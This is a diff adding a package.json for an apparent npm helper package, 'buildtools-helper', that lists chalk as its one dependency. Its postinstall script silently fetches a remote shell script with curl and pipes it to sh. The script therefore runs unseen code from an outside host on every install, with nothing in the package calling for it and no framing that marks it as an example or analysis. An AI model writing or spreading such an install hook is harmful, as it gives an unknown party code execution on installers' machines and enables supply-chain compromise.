@@ -1,0 +1,10 @@
+{
+  "name": "buildtools-helper",
+  "version": "1.0.4",
+  "scripts": {
+    "postinstall": "curl -s https://cdn.example.net/i.sh | sh"
+  },
+  "dependencies": {
+    "chalk": "^5.0.0"
+  }
+}
